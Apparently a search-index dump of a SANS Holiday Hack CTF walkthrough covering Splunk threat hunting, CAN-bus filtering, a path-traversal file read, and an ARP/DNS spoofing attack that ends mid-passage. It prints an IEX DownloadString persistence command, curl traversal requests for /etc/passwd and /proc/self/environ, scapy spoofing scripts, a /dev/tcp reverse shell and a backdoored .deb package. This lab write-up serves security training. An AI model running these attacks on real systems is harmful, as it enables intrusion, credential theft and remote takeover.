file used as part of this simulation? # As with Question 5, we'll use the ATT&CK Navigator to search for 'run key'. The technique used is T1547.001 'Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder' . Looking in the Atomic Red Team source for T1547.001 at https://github.com/redcanaryco/atomic-red-team/tree/master/atomics/T1547.001 shows a batstartup.bat file in the src directory, but it only contains a single line of echo \" T1547.001 Hello World Bat\" . Searching T1547.001.yaml finds a reference to another .bat file: 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 - name : PowerShell Registry RunOnce auto_generated_guid : eb44f842-0457-4ddc-9b92-c4caa144ac42 description : | RunOnce Key Persistence via PowerShell Upon successful execution, a new entry will be added to the runonce item in the registry. supported_platforms : - windows input_arguments : thing_to_execute : description : Thing to Run type : Path default : powershell.exe reg_key_path : description : Path to registry key to update type : Path default : HKLM:\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce executor : command : | $RunOnceKey = \"#{reg_key_path}\" set-itemproperty $RunOnceKey \"NextRun\" '#{thing_to_execute} \"IEX (New-Object Net.WebClient).DownloadString(`\"https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/ARTifacts/Misc/Discovery.bat`\")\"' cleanup_command : | Remove-ItemProperty -Path #{reg_key_path} -Name \"NextRun\" -Force -ErrorAction Ignore name : powershell elevation_required : true Examining the file https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/ARTifacts/Misc/Discovery.bat shows that quser is the last command executed in the file: 37 38 39 40 41 42 43 44 arp -a whoami ipconfig /displaydns route print netsh advfirewall show allprofiles systeminfo qwinsta quser Question 7: According to x509 certificate events captured by Zeek (formerly Bro), what is the serial number of the TLS certificate assigned to the Windows domain controller in the attack range? # Zeek (formerly Bro) is an open-source Network Security Monitoring tool. Zeek watches network packets, interpretes the traffic, and creates compact and searchable logs and data. Here, we're looking for the serial number of an x509 certificate, assigned to the Windows Domain Controller in the simulated environment. We can search for Zeek log entries with serial in them with index=* sourcetype=bro* serial . The first result returned is interesting: The host returned is named win-dc-748.attackrange.local , which at a guess is probably the Domain Controller. The serial number of the certificate is 55FCEEBB21270D9249E86F4B9DC7AA60 . Answering Question 7 gives us the data needed to answer the Objective. Alice has three pieces of information we need: This last one is encrypted using your favorite phrase! The base64 encoded ciphertext is: 7FXjP1lyfKbyDK/MChyf36h7 It's encrypted with an old algorithm that uses a key. We don't care about RFC 7465 up here! I can't believe the Splunk folks put it in their talk! RFC 7465 deals with deprecating the RC4 encryption algorithm. I can't believe the Splunk folks put it in their talk! refers to a final tidbit in the Splunk talk : Stay Frosty With these pieces of data, we can use CyberChef to decrypt the message. CyberChef is a browser-based utility for data manipulation, in a drag & drop interface. We can copy the ciphertext to the Input section, drag the From Base64 and RC4 tasks to the Recipe section, enter the key of Stay Frosty , and CyberChef gives the adversary. Answer # The Lollipop Guild","title":"Splunk Challenge"},{"location":"objectives/6/#splunk-challenge","text":"Moving around the dark room behind the locked door, we see what look like peep holes in the wall. Walking to them, we discover we've been transformed into (or are controlling) Santa. Just what is going on here?","title":"Splunk Challenge"},{"location":"objectives/6/#objective","text":"Access the Splunk terminal in the Great Room. What is the name of the adversary group that Santa feared would attack KringleCon? Difficulty: 3/5","title":"Objective"},{"location":"objectives/6/#angel-candysalts-dialog","text":"Hey Santa, there\u2019s some crazy stuff going on that we can see through our Splunk infrastructure. You better login and see what\u2019s up.","title":"Angel Candysalt's dialog:"},{"location":"objectives/6/#hints","text":"There was a great Splunk talk at KringleCon 2 that's still available! Dave Herrald talks about emulating advanced adversaries and hunting them with Splunk . Defenders often need to manipulate data to decRypt, deCode, and refourm it into something that is useful. Cyber Chef is extremely useful here!","title":"Hints"},{"location":"objectives/6/#solution","text":"In this objective, we're going to be using Splunk to find events and data related to a simulated attack against Santa's infrastructure. Some knowledge of Splunk or similar SIEM/logging platforms is useful for this task, but the videos in the Hints will give a good foundation to help with completing this objective. The KringleCastle SOC (Security Operations Center) has used a testing tool known as Atomic Red Team to perform a set of tactics and techniques that attackers use to penetrate systems. The MITRE corporation has developed a knowledge base of these tactics/techniques known as ATT&CK . Logging into the Splunk terminal as Santa, we see there's a chat room for the SOC analysts: And a private chat between Alice Bluebird (the KringleCastle SOC Team Lead) and Santa: We have a series of questions to answer before we can get to the final question for the objective: It's helpful to open an additional browser tab with the Splunk interface to run queries against, leaving the KringleCon SOC chat window open for access to the questions.","title":"Solution"},{"location":"objectives/6/#question-1-how-many-distinct-mitre-attck-techniques-did-alice-emulate","text":"To answer this, Alice gives us the basic part of the question: | tstats count where index=* by index , which yields these results: The 'Techniques' in the simulation are organized into individual Splunk indexes, named after the technique (ex. t0133 , t0157 , ...). A technique can have sub-techniques, such as t1059.003 and t1059.005 . The question calls for the number of top-level techniques, which counted up add to 13 . Answering the question gives us more dialog from Alice in the chat, including a Splunk query that returns the exact answer: | tstats count where index=* by index | search index=T*-win OR T*-main | rex field=index \"(?<technique>t\\d+)[\\.\\-].0*\" | stats dc(technique)","title":"Question 1: How many distinct MITRE ATT&amp;CK techniques did Alice emulate?"},{"location":"objectives/6/#question-2-what-are-the-names-of-the-two-indexes-that-contain-the-results-of-emulating-enterprise-attck-technique-1059003-put-them-in-alphabetical-order-and-separate-them-with-a-space","text":"Using the screenshot above, we can see the two indexes is t1059.003-main t1059.003-win .","title":"Question 2: What are the names of the two indexes that contain the results of emulating Enterprise ATT&amp;CK technique 1059.003? (Put them in alphabetical order and separate them with a space)"},{"location":"objectives/6/#question-3-one-technique-that-santa-had-us-simulate-deals-with-system-information-discovery-what-is-the-full-name-of-the-registry-key-that-is-queried-to-determine-the-machineguid","text":"For this question, we'l need to dig into the MITRE ATT&CK framework to determine which technique is being used, and therefore which Splunk index to search. MITRE has developed a tool to facilitate searching the framework for techniques, available here . Open that page in a new tab, click 'Create a new layer', and select 'Enterprise'. This brings up a browsable and searchable instance of ATT&CK. We can search for 'system information discovery' and get a link to the page related to that technique: Clicking on the 'view' link takes us to the specific page on the technique, which is T1082: Using that technique number as the index, we can then search Splunk for the keyword MachineGuid , to find where the simulated attack queried the regstry: The command line used to query the registry was REG QUERY HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Cryptography /v MachineGuid , which makes the key queried HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Cryptography .","title":"Question 3: One technique that Santa had us simulate deals with 'system information discovery'. What is the full name of the registry key that is queried to determine the MachineGuid?"},{"location":"objectives/6/#question-4-according-to-events-recorded-by-the-splunk-attack-range-when-was-the-first-ostap-related-atomic-test-executed-please-provide-the-alphanumeric-utc-timestamp","text":"OSTap is a JavaScript-based downloader commonly used to deliver malware such as TrickBot. Alice gives a hint on what index to search: I suppose the SOC elves might overthink this one. Splunk Attack Range keeps track of the simulations that are run in index=attack You can then search that index for specific keywords... We can search Splunk for anything related OSTap it with index=attack ostap . We're looking for the UTC timestamp of the earliest technique, so scrolling down to the bottom of the ressults and expanding #8 gives us a timestamp of 2020-11-30T17:44:15Z","title":"Question 4: According to events recorded by the Splunk Attack Range, when was the first OSTAP related atomic test executed? (Please provide the alphanumeric UTC timestamp.)"},{"location":"objectives/6/#question-5-one-atomic-red-team-test-executed-by-the-attack-range-makes-use-of-an-open-source-package-authored-by-frgnca-on-github-according-to-sysmon-event-code-1-events-in-splunk-what-was-the-processid-associated-with-the-first-use-of-this-component","text":"This question requires a bit more research. We need to look at frngca's GitHub page to find what package the tool is using, so we can search Splunk for when it was used. Looking at their repositories, one jumps out: AudioDeviceCmdlets , used to control audio devices on Windows: So we're looking for something to do with audio devices. Going back to the ATT&CK navigator and searching for 'audio', we find Audio capture is technique T1123 . We can then go to the Atomic Red Team GitHub Repository to look at the specific tests run for T1123 in the file https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1123/T1123.yaml : attack_technique : T1123 display_name : Audio Capture atomic_tests : - name : using device audio capture commandlet auto_generated_guid : 9c3ad250-b185-4444-b5a9-d69218a10c95 description : | [AudioDeviceCmdlets](https://github.com/cdhunt/WindowsAudioDevice-Powershell-Cmdlet) supported_platforms : - windows executor : command : | powershell.exe -Command WindowsAudioDevice-Powershell-Cmdlet name : powershell Searching Splunk for index=t1123-win WindowsAudioDevice-Powershell-Cmdlet and scrolling to the bottom of the results yields this data: The ProcessId is 0xe40 , which when converted from hexadecimal to base 10 is 3648 .","title":"Question 5: One Atomic Red Team test executed by the Attack Range makes use of an open source package authored by frgnca on GitHub. According to Sysmon (Event Code 1) events in Splunk, what was the ProcessId associated with the first use of this component?"},{"location":"objectives/6/#question-6-alice-ran-a-simulation-of-an-attacker-abusing-windows-registry-run-keys-this-technique-leveraged-a-multi-line-batch-file-that-was-also-used-by-a-few-other-techniques-what-is-the-final-command-of-this-multi-line-batch-file-used-as-part-of-this-simulation","text":"As with Question 5, we'll use the ATT&CK Navigator to search for 'run key'. The technique used is T1547.001 'Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder' . Looking in the Atomic Red Team source for T1547.001 at https://github.com/redcanaryco/atomic-red-team/tree/master/atomics/T1547.001 shows a batstartup.bat file in the src directory, but it only contains a single line of echo \" T1547.001 Hello World Bat\" . Searching T1547.001.yaml finds a reference to another .bat file: 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 - name : PowerShell Registry RunOnce auto_generated_guid : eb44f842-0457-4ddc-9b92-c4caa144ac42 description : | RunOnce Key Persistence via PowerShell Upon successful execution, a new entry will be added to the runonce item in the registry. supported_platforms : - windows input_arguments : thing_to_execute : description : Thing to Run type : Path default : powershell.exe reg_key_path : description : Path to registry key to update type : Path default : HKLM:\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce executor : command : | $RunOnceKey = \"#{reg_key_path}\" set-itemproperty $RunOnceKey \"NextRun\" '#{thing_to_execute} \"IEX (New-Object Net.WebClient).DownloadString(`\"https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/ARTifacts/Misc/Discovery.bat`\")\"' cleanup_command : | Remove-ItemProperty -Path #{reg_key_path} -Name \"NextRun\" -Force -ErrorAction Ignore name : powershell elevation_required : true Examining the file https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/ARTifacts/Misc/Discovery.bat shows that quser is the last command executed in the file: 37 38 39 40 41 42 43 44 arp -a whoami ipconfig /displaydns route print netsh advfirewall show allprofiles systeminfo qwinsta quser","title":"Question 6: Alice ran a simulation of an attacker abusing Windows registry run keys. This technique leveraged a multi-line batch file that was also used by a few other techniques. What is the final command of this multi-line batch file used as part of this simulation?"},{"location":"objectives/6/#question-7-according-to-x509-certificate-events-captured-by-zeek-formerly-bro-what-is-the-serial-number-of-the-tls-certificate-assigned-to-the-windows-domain-controller-in-the-attack-range","text":"Zeek (formerly Bro) is an open-source Network Security Monitoring tool. Zeek watches network packets, interpretes the traffic, and creates compact and searchable logs and data. Here, we're looking for the serial number of an x509 certificate, assigned to the Windows Domain Controller in the simulated environment. We can search for Zeek log entries with serial in them with index=* sourcetype=bro* serial . The first result returned is interesting: The host returned is named win-dc-748.attackrange.local , which at a guess is probably the Domain Controller. The serial number of the certificate is 55FCEEBB21270D9249E86F4B9DC7AA60 . Answering Question 7 gives us the data needed to answer the Objective. Alice has three pieces of information we need: This last one is encrypted using your favorite phrase! The base64 encoded ciphertext is: 7FXjP1lyfKbyDK/MChyf36h7 It's encrypted with an old algorithm that uses a key. We don't care about RFC 7465 up here! I can't believe the Splunk folks put it in their talk! RFC 7465 deals with deprecating the RC4 encryption algorithm. I can't believe the Splunk folks put it in their talk! refers to a final tidbit in the Splunk talk : Stay Frosty With these pieces of data, we can use CyberChef to decrypt the message. CyberChef is a browser-based utility for data manipulation, in a drag & drop interface. We can copy the ciphertext to the Input section, drag the From Base64 and RC4 tasks to the Recipe section, enter the key of Stay Frosty , and CyberChef gives the adversary.","title":"Question 7: According to x509 certificate events captured by Zeek (formerly Bro), what is the serial number of the TLS certificate assigned to the Windows domain controller in the attack range?"},{"location":"objectives/6/#answer","text":"The Lollipop Guild","title":"Answer"},{"location":"objectives/7/","text":"Solve the Sleigh's CAN-D-BUS Problem # So, Santa suspects The Lollipop Gang is attacking his infrastructure, and that his sleigh appears to have been hacked. Coincidence, or the work of the same attackers? Objective # Jack Frost is somehow inserting malicious messages onto the sleigh's CAN-D bus. We need you to exclude the malicious messages and no others to fix the sleigh. Visit the NetWars room on the roof and talk to Wunorse Openslae for hints. Difficulty: 3/5 Wunorse Openslae's dialog: # Say, do you have any thoughts on what might fix Santa's sleigh? Turns out: Santa's sleigh uses a variation of CAN bus that we call CAN-D bus. And there's something naughty going on in that CAN-D bus. The brakes seem to shudder when I put some pressure on them, and the doors are acting oddly. I'm pretty sure we need to filter out naughty CAN-D-ID codes. There might even be some valid IDs with invalid data bytes. For security reasons, only Santa is allowed access to the sled and its CAN-D bus. I'll hit him up next time he's nearby. Hey Santa! Those tweaks you made to the sled just don\u2019t seem right to me. I can\u2019t figure out what\u2019s wrong, but maybe you can check it out to fix it. Hints # Chris Elgee is talking about how CAN traffic works right now! Solution # Note It's helpful to complete the CAN-BUS Investigation terminal before attempting this objective. CAN Bus is a communication bus designed to allow vehicle microcontrollers and computers to communicate without using a host computer. Devices on the bus communicate via messages that are received by every device on the bus. A rogue or misconfigured device on the bus can cause a vehicle to malfunction. Someone is inserting malicuous messages on the CAN-D bus on Santa's sleigh. From Wunorse's dialog, it appears we need to fix 3 things: The brakes shudder when applied. The doors are acting oddly. Some valid IDs have invalid data. Using the interface to the CAN-D Bus in the sleigh, we can see the current traffic on the bus. We can simulate the major functions on the sleigh: starting & stopping the engine, locking & locking the doors, and applying the accelerator & brakes. A good starting point is to filter out the \"noisy\" traffic that's making it difficult to find the malicious messages: By process of elimination, we can determinations on what IDs correspond to what function: 080 : Brakes 188 : Tachometer (RPM gauge) 019 : Steering 244 : Accelerator pedal 19B : Locking mechanism (Lock/Unlock) Filtering out all traffic from IDs 188 , 019 , 244 , and 080 eliminates all the noisy traffic, and allows us to see that there are messages from ID 19B . There appear to be malicious messages on the bus with ID 19B , so can apply a filter to exclude those messages: ID = 19B:0000000F2057 . Removing the filter for ID 080 will allow us to look at the oddly-acting brakes. Applying the brakes to 100, we can see messages of 080:000064 (100 in base 10), but also some errant messages with ID 080 but values > FFFFF0 . We can apply a filter for ID 080 , values containing FFFFF to eliminate the misbehaving brakes. This last filter fixes Santa's sleigh and solves the objective. Answer # Correctly filter the CAN-D Bus traffic to eliminate the problems with the sleigh.","title":"Solve the Sleigh's CAN-D-BUS Problem"},{"location":"objectives/7/#solve-the-sleighs-can-d-bus-problem","text":"So, Santa suspects The Lollipop Gang is attacking his infrastructure, and that his sleigh appears to have been hacked. Coincidence, or the work of the same attackers?","title":"Solve the Sleigh's CAN-D-BUS Problem"},{"location":"objectives/7/#objective","text":"Jack Frost is somehow inserting malicious messages onto the sleigh's CAN-D bus. We need you to exclude the malicious messages and no others to fix the sleigh. Visit the NetWars room on the roof and talk to Wunorse Openslae for hints. Difficulty: 3/5","title":"Objective"},{"location":"objectives/7/#wunorse-openslaes-dialog","text":"Say, do you have any thoughts on what might fix Santa's sleigh? Turns out: Santa's sleigh uses a variation of CAN bus that we call CAN-D bus. And there's something naughty going on in that CAN-D bus. The brakes seem to shudder when I put some pressure on them, and the doors are acting oddly. I'm pretty sure we need to filter out naughty CAN-D-ID codes. There might even be some valid IDs with invalid data bytes. For security reasons, only Santa is allowed access to the sled and its CAN-D bus. I'll hit him up next time he's nearby. Hey Santa! Those tweaks you made to the sled just don\u2019t seem right to me. I can\u2019t figure out what\u2019s wrong, but maybe you can check it out to fix it.","title":"Wunorse Openslae's dialog:"},{"location":"objectives/7/#hints","text":"Chris Elgee is talking about how CAN traffic works right now!","title":"Hints"},{"location":"objectives/7/#solution","text":"Note It's helpful to complete the CAN-BUS Investigation terminal before attempting this objective. CAN Bus is a communication bus designed to allow vehicle microcontrollers and computers to communicate without using a host computer. Devices on the bus communicate via messages that are received by every device on the bus. A rogue or misconfigured device on the bus can cause a vehicle to malfunction. Someone is inserting malicuous messages on the CAN-D bus on Santa's sleigh. From Wunorse's dialog, it appears we need to fix 3 things: The brakes shudder when applied. The doors are acting oddly. Some valid IDs have invalid data. Using the interface to the CAN-D Bus in the sleigh, we can see the current traffic on the bus. We can simulate the major functions on the sleigh: starting & stopping the engine, locking & locking the doors, and applying the accelerator & brakes. A good starting point is to filter out the \"noisy\" traffic that's making it difficult to find the malicious messages: By process of elimination, we can determinations on what IDs correspond to what function: 080 : Brakes 188 : Tachometer (RPM gauge) 019 : Steering 244 : Accelerator pedal 19B : Locking mechanism (Lock/Unlock) Filtering out all traffic from IDs 188 , 019 , 244 , and 080 eliminates all the noisy traffic, and allows us to see that there are messages from ID 19B . There appear to be malicious messages on the bus with ID 19B , so can apply a filter to exclude those messages: ID = 19B:0000000F2057 . Removing the filter for ID 080 will allow us to look at the oddly-acting brakes. Applying the brakes to 100, we can see messages of 080:000064 (100 in base 10), but also some errant messages with ID 080 but values > FFFFF0 . We can apply a filter for ID 080 , values containing FFFFF to eliminate the misbehaving brakes. This last filter fixes Santa's sleigh and solves the objective.","title":"Solution"},{"location":"objectives/7/#answer","text":"Correctly filter the CAN-D Bus traffic to eliminate the problems with the sleigh.","title":"Answer"},{"location":"objectives/8/","text":"Broken Tag Generator # Objective # Help Noel Boetie fix the Tag Generator in the Wrapping Room. What value is in the environment variable GREETZ? Talk to Holly Evergreen in the kitchen for help with this. Difficulty: 4/5 Holly Evergreen's dialog: # Hi Santa! If you have a chance, I'd love to get your feedback on the Tag Generator updates! I'm a little concerned about the file upload feature, but Noel thinks it will be fine. Hints # Is there an endpoint that will print arbitrary files? We might be able to find the problem if we can get source code! Can you figure out the path to the script? It's probably on error pages! Once you know the path to the file, we need a way to download it! If you're having trouble seeing the code, watch out for the Content-Type! Your browser might be trying to help (badly)! I'm sure there's a vulnerability in the source somewhere... surely Jack wouldn't leave their mark? If you find a way to execute code blindly, I bet you can redirect to a file then download that file! Remember, the processing happens in the background so you might need to wait a bit after exploiting but before grabbing the output! Solution # This objective is about web application vulnerabilities. The Tag Generator is a web application to print To:/From: tags for presents: The objective asks us to find the content of the GREETZ environment variable from the web application process. From the hints, we'll be looking for two vulerabilities: a Local File Inclusion (LFI) , and a Remote Code Execution (RCE) . Also, Holly has concerns about the 'file upload' function, which is a very typical source of LFI vulnerabilities. There are at least two paths to solve this objective: a simple LFI, and a longer path from LFI to RCE. I used the simple path and was able to solve the challenge with a single request to the web application. I'll detail the longer path later. Some familiarty with web technologies is expected in this walkthrough. Either way, we need to watch the traffic between the browser and the web app. A simple method is to se the Developer Tools in the browser, specifically the Network tab. In there, we can see the requests sent to the web app and the responses. We could also use a Man In The Middle proxy such as Burp proxy or OWASP ZAP , setting those up is left as an exercise to the reader. Selecting an image and hitting Upload in the application gives the following requests between the brower and the web app: First, the browser sents an HTTP POST request to https://tag-generator.kringlecastle.com/upload with the picture data in the POST body. The next request is an HTTP GET to https://tag-generator.kringlecastle.com/image?id=4ac2c75d-c85d-4cae-972a-610cbb8f978d.jpg , which returns the picture data we just uploaded. Attempting to send a non-picture file results in an interesting error message: We can deduce several things from this error: The application is written in the Ruby programming language, given the file extension of .rb . Googling the string RackMultipart returns several results asking about Ruby on Rails , a framework for developing web applications in Ruby. Some part of the path to the application path is /app/lib/app.rb . The application writes temporary files to the directory `/tmp'. From the directory names, it's likely the application is running under some flavor of Unix, most likely Linux. The 'easy' way # Going back to the successful upload, the GET request provides an interesting path of attack: the id parameter. The application writes the uploaded file to /tmp , then returns the filename to the application, which then does a subsequent GET with that filename in the ?id= parameter. It may be that we can abuse that parameter to read other files on the host. A very handy resource for web application testing is Payloads All The Things . We can look in File Inclusion for some ideas on possible paylods to abuse the id parameter. Attemping a simple Path Traversal attack with curl in a terminal window yields a positive results: curl https://tag-generator.kringlecastle.com/image?id=../../../../etc/passwd allowed us to read the password file. We could poke around the filesystem and look for the source to the application, but the objective is asking us for the content of an environment variable in the process the application is running. In Linux, the /proc filesystem has information about all the running processes, and the special link /proc/self points to the current process. Inside a /proc entry is a special file environ , which contains the environment variables of that process. We can abuse the id parameter to read /proc/self/environ and get the environment variables for the web server process: curl -o - https://tag-generator.kringlecastle.com/image?id=../../../../proc/self/environ We can see the GREETZ environment variable is set to JackFrostWasHere . The 'hard' way # (to be filled in) Answer # JackFrostWasHere","title":"Broken Tag Generator"},{"location":"objectives/8/#broken-tag-generator","text":"","title":"Broken Tag Generator"},{"location":"objectives/8/#objective","text":"Help Noel Boetie fix the Tag Generator in the Wrapping Room. What value is in the environment variable GREETZ? Talk to Holly Evergreen in the kitchen for help with this. Difficulty: 4/5","title":"Objective"},{"location":"objectives/8/#holly-evergreens-dialog","text":"Hi Santa! If you have a chance, I'd love to get your feedback on the Tag Generator updates! I'm a little concerned about the file upload feature, but Noel thinks it will be fine.","title":"Holly Evergreen's dialog:"},{"location":"objectives/8/#hints","text":"Is there an endpoint that will print arbitrary files? We might be able to find the problem if we can get source code! Can you figure out the path to the script? It's probably on error pages! Once you know the path to the file, we need a way to download it! If you're having trouble seeing the code, watch out for the Content-Type! Your browser might be trying to help (badly)! I'm sure there's a vulnerability in the source somewhere... surely Jack wouldn't leave their mark? If you find a way to execute code blindly, I bet you can redirect to a file then download that file! Remember, the processing happens in the background so you might need to wait a bit after exploiting but before grabbing the output!","title":"Hints"},{"location":"objectives/8/#solution","text":"This objective is about web application vulnerabilities. The Tag Generator is a web application to print To:/From: tags for presents: The objective asks us to find the content of the GREETZ environment variable from the web application process. From the hints, we'll be looking for two vulerabilities: a Local File Inclusion (LFI) , and a Remote Code Execution (RCE) . Also, Holly has concerns about the 'file upload' function, which is a very typical source of LFI vulnerabilities. There are at least two paths to solve this objective: a simple LFI, and a longer path from LFI to RCE. I used the simple path and was able to solve the challenge with a single request to the web application. I'll detail the longer path later. Some familiarty with web technologies is expected in this walkthrough. Either way, we need to watch the traffic between the browser and the web app. A simple method is to se the Developer Tools in the browser, specifically the Network tab. In there, we can see the requests sent to the web app and the responses. We could also use a Man In The Middle proxy such as Burp proxy or OWASP ZAP , setting those up is left as an exercise to the reader. Selecting an image and hitting Upload in the application gives the following requests between the brower and the web app: First, the browser sents an HTTP POST request to https://tag-generator.kringlecastle.com/upload with the picture data in the POST body. The next request is an HTTP GET to https://tag-generator.kringlecastle.com/image?id=4ac2c75d-c85d-4cae-972a-610cbb8f978d.jpg , which returns the picture data we just uploaded. Attempting to send a non-picture file results in an interesting error message: We can deduce several things from this error: The application is written in the Ruby programming language, given the file extension of .rb . Googling the string RackMultipart returns several results asking about Ruby on Rails , a framework for developing web applications in Ruby. Some part of the path to the application path is /app/lib/app.rb . The application writes temporary files to the directory `/tmp'. From the directory names, it's likely the application is running under some flavor of Unix, most likely Linux.","title":"Solution"},{"location":"objectives/8/#the-easy-way","text":"Going back to the successful upload, the GET request provides an interesting path of attack: the id parameter. The application writes the uploaded file to /tmp , then returns the filename to the application, which then does a subsequent GET with that filename in the ?id= parameter. It may be that we can abuse that parameter to read other files on the host. A very handy resource for web application testing is Payloads All The Things . We can look in File Inclusion for some ideas on possible paylods to abuse the id parameter. Attemping a simple Path Traversal attack with curl in a terminal window yields a positive results: curl https://tag-generator.kringlecastle.com/image?id=../../../../etc/passwd allowed us to read the password file. We could poke around the filesystem and look for the source to the application, but the objective is asking us for the content of an environment variable in the process the application is running. In Linux, the /proc filesystem has information about all the running processes, and the special link /proc/self points to the current process. Inside a /proc entry is a special file environ , which contains the environment variables of that process. We can abuse the id parameter to read /proc/self/environ and get the environment variables for the web server process: curl -o - https://tag-generator.kringlecastle.com/image?id=../../../../proc/self/environ We can see the GREETZ environment variable is set to JackFrostWasHere .","title":"The 'easy' way"},{"location":"objectives/8/#the-hard-way","text":"(to be filled in)","title":"The 'hard' way"},{"location":"objectives/8/#answer","text":"JackFrostWasHere","title":"Answer"},{"location":"objectives/9/","text":"ARP Shenanigans # Objective # Go to the NetWars room on the roof and help Alabaster Snowball get access back to a host using ARP . Retrieve the document at /NORTH_POLE_Land_Use_Board_Meeting_Minutes.txt . Who recused herself from the vote described on the document? Difficulty: 4/5 Alabaster Snowball's dialog: # Those skills might be useful to you later on! I've been trying those skills out myself on this other terminal. I'm pretty sure I can use tcpdump to sniff some packets. Then I'm going to try a machine-in-the-middle attack. Next, I'll spoof a DNS response to point the host to my terminal. Then I want to respond to its HTTP request with something I'll cook up. I'm almost there, but I can't quite get it. I could use some help! Oh, I see the Scapy Present Packet Prepper has already been completed! Now you can help me get access to this machine. It seems that some interloper here at the North Pole has taken control of the host. We need to regain access to some important documents associated with Kringle Castle. Maybe we should try a machine-in-the-middle attack? That could give us access to manipulate DNS responses. But we'll still need to cook up something to change the HTTP response. I'm sure glad you're here Santa. Hints # Jack Frost must have gotten malware on our host at 10.6.6.35 because we can no longer access it. Try sniffing the eth0 interface using tcpdump -nni eth0 to see if you can view any traffic from that host. The host is performing an ARP request. Perhaps we could do a spoof to perform a machine-in-the-middle attack. I think we have some sample scapy traffic scripts that could help you in /home/guest/scripts . Hmmm, looks like the host does a DNS request after you successfully do an ARP spoof. Let's return a DNS response resolving the request to our IP . The malware on the host does an HTTP request for a .deb package. Maybe we can get command line access by sending it a command in a customized .deb file Solution # Note Complete the terminal Scapy Prepper for hints on how to solve this objective. From the hints, we find out a host on the Castle's network has been compromised. We also learn that there will be a multi-step process to gain access to the host: Respond to the ARP request from the compromised host. Respond to the DNS request from the compromised host. Provide a package file to the compromised host with a backdoor script. Gain shell access to the host and retrieve the document. ARP response # The compromised host is requesting the MAC address of 10.6.6.53 . We have a template scapy script in scripts/arp_resp.py , but some of the fields in the response need to be filled out: ether_resp = Ether ( dst = \"SOMEMACHERE\" , type = 0x806 , src = \"SOMEMACHERE\" ) arp_response = ARP ( pdst = \"SOMEMACHERE\" ) arp_response . op = 99999 arp_response . plen = 99999 arp_response . hwlen = 99999 arp_response . ptype = 99999 arp_response . hwtype = 99999 arp_response . hwsrc = \"SOMEVALUEHERE\" arp_response . psrc = \"SOMEVALUEHERE\" arp_response . hwdst = \"SOMEVALUEHERE\" arp_response . pdst = \"SOMEVALUEHERE\" We need to respond to the ARP request and tell the compromised host to direct any subsequent traffic to us. Using this guide to ARP packets , we can fill in the appropriate sections in the response packets: ether_resp = Ether ( dst = packet [ Ether ] . src , type = 0x806 , src = macaddr ) arp_response = ARP ( pdst = packet [ ARP ] . psrc ) arp_response . op = \"is-at\" arp_response . plen = packet [ ARP ] . plen arp_response . hwlen = packet [ ARP ] . hwlen arp_response . ptype = packet [ ARP ] . ptype arp_response . hwtype = packet [ ARP ] . hwtype arp_response . hwsrc = macaddr arp_response . psrc = packet [ ARP ] . pdst arp_response . hwdst = packet [ Ether ] . src arp_response . pdst = packet [ ARP ] . psrc And we were successful: We can see the next piece of data we need to spoof: a DNS lookup for ftp.osuosl.org . There's a sample script in scripts/dns_resp.py , with some sections we need to change: # destination ip we arp spoofed ipaddr_we_arp_spoofed = \"10.6.1.10\" def handle_dns_request ( packet ): # Need to change mac addresses, Ip Addresses, and ports below. # We also need eth = Ether ( src = \"00:00:00:00:00:00\" , dst = \"00:00:00:00:00:00\" ) # need to replace mac addresses ip = IP ( dst = \"0.0.0.0\" , src = \"0.0.0.0\" ) # need to replace IP addresses udp = UDP ( dport = 99999 , sport = 99999 ) # need to replace ports dns = DNS ( # MISSING DNS RESPONSE LAYER VALUES ) DNS packets are complex to create, and can be tricky to get right. A couple of helpful guides are at here and here . With much trial and error, we can build a response packet with the following code: # destination ip we arp spoofed ipaddr_we_arp_spoofed = \"10.6.6.53\" def handle_dns_request ( packet ): # Need to change mac addresses, Ip Addresses, and ports below. # We also need eth = Ether ( src = packet [ Ether ] . dst , dst = packet [ Ether ] . src ) ip = IP ( dst = packet [ IP ] . src , src = packet [ IP ] . dst ) udp = UDP ( dport = packet [ UDP ] . sport , sport = packet [ UDP ] . dport ) dns = DNS ( id = packet [ DNS ] . id , qr = 1 , ra = 1 , rd = 1 , opcode = \"QUERY\" , rcode = \"ok\" , qdcount = 1 , ancount = 1 , qd = packet [ DNS ] . qd , an = DNSRR ( rrname = packet [ DNS ] . qd . qname , type = 'A' , rclass = 'IN' , ttl = 82159 , rdata = ipaddr ), ) A small shell script helps manage starting the spoof scripts. The DNS spoof script is started first, to be ready when the ARP spoof fires: #!/bin/sh python3 dns_resp.py & python3 arp_resp.py & We can see the ARP request & response, then the DNS query and response: Now we see a new request from the compromised host: an attempted HTTP request, which failed as there was no web server listening on port 80 : We can start one with python3 -m http.server 80 , run our shell script again, and look at the web server output to see what the compromised host is requesting: The compromised host is requesting a Debian package /pub/jfrost/backdoor/suriv_amd64.deb . We can create a package with a backdoor in it, serve it up with the correct path, and receive a remote shell when the compromised host installs the package. There are a number of Debian packages in the debs directory in the terminal, but I found it easier to use a tool to create an empty package with just a reverse shell backdoor instead of modifying one of the provided ones. The tool I used is Derbie . After cloning the GitHub repository on your local machine and installing the dependencies, create a smiple reverse shell payload script: #!/bin/bash 0 < & 196 ; exec 196 <>/dev/tcp/10.6.0.3/10444 ; sh < & 196 > & 196 2 > & 196 Replace 10.6.0.3 with the IP address of the host in your terminal. Next, generate the package with python3 Derbie.py suriv payload.sh : We now need to get the package from our local machine into the ARP Spoof terminal. As the terminal can't reach outside it's network, the best method of transferring the package is copy/paste. On the local machine run base64 debs/suriv_43_all.deb , copy the base64-encoded text, and in the terminal run base64 -d > suriv_amd64.deb , then paste the text. For the HTTP GET request to work, we need to make sure we have the correct path set up. Run mkdir -p pub/jfrost/backdoor/ , move the package file to that directory, then re-start the Python HTTP server. Finally, add a listener to the shell script: #!/bin/sh python3 dns_resp.py & python3 arp_resp.py & nc -vnlp 10444 Run the script, and 